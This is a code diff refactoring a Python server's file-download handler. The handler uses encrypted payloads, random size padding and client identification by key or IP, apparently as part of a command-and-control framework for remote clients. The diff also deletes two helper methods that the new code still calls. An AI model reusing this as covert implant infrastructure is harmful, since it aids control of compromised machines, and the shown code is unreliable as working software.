@@ -14,111 +14,137 @@ class FileDownloadHandler(BaseHandler):
     
     def handle(self):
         """Process file download request from client (server sends, client downloads)"""
-        # Log the specific path being used for debugging
-        self.log_message(f"File download request received on path: {self.request_handler.path}")
+        # Get the operation payload
+        payload = self.get_operation_payload()
         
-        # Get content data
-        content_length = int(self.headers.get('Content-Length', 0))
-        if content_length == 0:
-            self.send_error_response(400, "Missing content")
-            return
-            
-        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
-        
-        try:
-            # Parse the JSON request
-            request_json = json.loads(request_body)
-            encrypted_data = request_json.get('d') or request_json.get('data')
-            
-            # Extract token padding (if present - discard it since we don't need it)
-            token = request_json.get('t', '') or request_json.get('token', '')
-            if token:
-                self.log_message(f"Received file download request with {len(token)} bytes of token padding")
-                
-            # Verify presence of encrypted data
-            if not encrypted_data:
-                self.send_error_response(400, "Missing encrypted data field")
-                return
-            
-            # Identify client by key-based decryption
-            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
-            
-            # If client identification failed but client_id was provided in request
-            if client_id is None:
-                provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
-                
-                if provided_client_id:
-                    # Try decryption using the provided client ID
-                    try:
-                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
-                        client_id = provided_client_id
-                    except Exception as e:
-                        logger.error(f"Failed to decrypt using provided client ID: {e}")
-            
-            if client_id is None or decrypted_data is None:
-                self.send_error_response(400, "Authentication failed - could not decrypt data")
-                return
-                
-            # Process the file request
-            response = self._process_file_request(client_id, decrypted_data)
-            
-            # Encrypt the response
-            response_json = json.dumps(response)
-            encrypted_response = self.crypto_helper.encrypt(response_json, client_id)
-            
-            # Add token padding to the response
-            token_padding = self._generate_token_padding()
-            
-            # Send the encrypted response with token padding using standardized format
-            self.send_response(200, "application/json", json.dumps({
-                "d": encrypted_response,  # Shortened from "data"
-                "t": token_padding        # Shortened from "token"
-            }))
-            
-        except json.JSONDecodeError as e:
-            logger.error(f"JSON decode error: {e} - Request body: {request_body[:100]}...")
-            self.send_error_response(400, f"Invalid JSON format: {str(e)}")
-        except Exception as e:
-            logger.error(f"Error handling file download request: {e}")
-            
-            # Send structured error response
-            error_response = {
-                "Status": "Error",
-                "Message": str(e)
-            }
-            
+        if payload:
+            # Modern approach - operation payload from OperationRouter
             try:
-                if 'client_id' in locals() and client_id:
-                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
+                # Check if we have FilePath in the payload
+                if "FilePath" in payload:
+                    # Identify client from the request
+                    client_id = None
+                    
+                    if hasattr(self.request_handler, 'client_id'):
+                        client_id = self.request_handler.client_id
+                    
+                    if not client_id:
+                        # If we don't have the client ID, try to get it from the client address
+                        client_id = self._identify_client_by_ip()
+                    
+                    if not client_id:
+                        self.log_message(f"Cannot identify client for file download")
+                        self.send_error_response(401, "Authentication failed")
+                        return
+                    
+                    # Process the file request
+                    response = self._process_file_request(client_id, payload)
+                    
+                    # Encrypt the response
+                    encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
+                    
+                    # Add token padding
                     token_padding = self._generate_token_padding()
+                    
+                    # Send the response
                     self.send_response(200, "application/json", json.dumps({
-                        "d": encrypted_error,  # Shortened from "data"
-                        "t": token_padding     # Shortened from "token"
+                        "d": encrypted_response,
+                        "t": token_padding
                     }))
                 else:
+                    self.log_message(f"Invalid file download payload format")
+                    self.send_error_response(400, "Invalid payload format")
+            except Exception as e:
+                logger.error(f"Error processing file download payload: {e}")
+                self.send_error_response(500, "Server error")
+        else:
+            # Legacy approach - parse from request body
+            # Log the specific path being used for debugging
+            self.log_message(f"File download request received on path: {self.request_handler.path}")
+            
+            # Get content data
+            content_length = int(self.headers.get('Content-Length', 0))
+            if content_length == 0:
+                self.send_error_response(400, "Missing content")
+                return
+                
+            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
+            
+            try:
+                # Parse the JSON request
+                request_json = json.loads(request_body)
+                encrypted_data = request_json.get('d') or request_json.get('data')
+                
+                # Extract token padding (if present - discard it since we don't need it)
+                token = request_json.get('t', '') or request_json.get('token', '')
+                if token:
+                    self.log_message(f"Received file download request with {len(token)} bytes of token padding")
+                    
+                # Verify presence of encrypted data
+                if not encrypted_data:
+                    self.send_error_response(400, "Missing encrypted data field")
+                    return
+                
+                # Identify client by key-based decryption
+                client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
+                
+                # If client identification failed but client_id was provided in request
+                if client_id is None:
+                    provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
+                    
+                    if provided_client_id:
+                        # Try decryption using the provided client ID
+                        try:
+                            decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
+                            client_id = provided_client_id
+                        except Exception as e:
+                            logger.error(f"Failed to decrypt using provided client ID: {e}")
+                
+                if client_id is None or decrypted_data is None:
+                    self.send_error_response(400, "Authentication failed - could not decrypt data")
+                    return
+                    
+                # Process the file request
+                response = self._process_file_request(client_id, decrypted_data)
+                
+                # Encrypt the response
+                response_json = json.dumps(response)
+                encrypted_response = self.crypto_helper.encrypt(response_json, client_id)
+                
+                # Add token padding
+                token_padding = self._generate_token_padding()
+                
+                # Send the encrypted response with token padding using standardized format
+                self.send_response(200, "application/json", json.dumps({
+                    "d": encrypted_response,  # Shortened from "data"
+                    "t": token_padding        # Shortened from "token"
+                }))
+                
+            except json.JSONDecodeError as e:
+                logger.error(f"JSON decode error: {e} - Request body: {request_body[:100]}...")
+                self.send_error_response(400, f"Invalid JSON format: {str(e)}")
+            except Exception as e:
+                logger.error(f"Error handling file download request: {e}")
+                
+                # Send structured error response
+                error_response = {
+                    "Status": "Error",
+                    "Message": str(e)
+                }
+                
+                try:
+                    if 'client_id' in locals() and client_id:
+                        encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
+                        token_padding = self._generate_token_padding()
+                        self.send_response(200, "application/json", json.dumps({
+                            "d": encrypted_error,  # Shortened from "data"
+                            "t": token_padding     # Shortened from "token"
+                        }))
+                    else:
+                        self.send_error_response(500, "Server Error")
+                except Exception as e2:
+                    logger.error(f"Error sending error response: {e2}")
                     self.send_error_response(500, "Server Error")
-            except Exception as e2:
-                logger.error(f"Error sending error response: {e2}")
-                self.send_error_response(500, "Server Error")
-    
-    def _generate_token_padding(self):
-        """Generate random token padding for responses"""
-        # Generate a random length between 50 and 500 characters
-        padding_length = random.randint(50, 500)
-        
-        # Generate random padding content
-        chars = string.ascii_letters + string.digits
-        padding = ''.join(random.choice(chars) for _ in range(padding_length))
-        
-        return padding
-    
-    def _identify_client_by_ip(self):
-        """Identify client based on IP address as fallback"""
-        client_ip = self.client_address[0]
-        for client_id, client_info in self.client_manager.get_clients_info().items():
-            if client_info.get('ip') == client_ip:
-                return client_id
-        return None
             
     def _process_file_request(self, client_id, file_request_json):
         """
